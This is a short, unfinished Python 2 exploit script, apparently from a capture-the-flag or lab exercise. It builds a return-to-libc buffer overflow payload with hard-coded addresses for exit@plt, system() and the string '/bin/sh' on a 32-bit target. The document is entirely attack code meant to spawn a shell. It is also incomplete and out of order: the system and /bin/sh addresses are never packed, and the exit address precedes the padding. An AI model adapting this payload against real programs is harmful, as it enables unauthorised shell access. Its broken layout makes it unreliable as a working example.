import struct

exit_plt = 0x80497e0
libc_base_adr = 0xf7e2c000
system_adr = libc_base_adr + 0x3eed0
bin_sh_adr = libc_base_adr + 0x15d7ec
padding = 45

payload = ""
payload += struct.pack("<I", exit_plt)
payload += "A" * padding
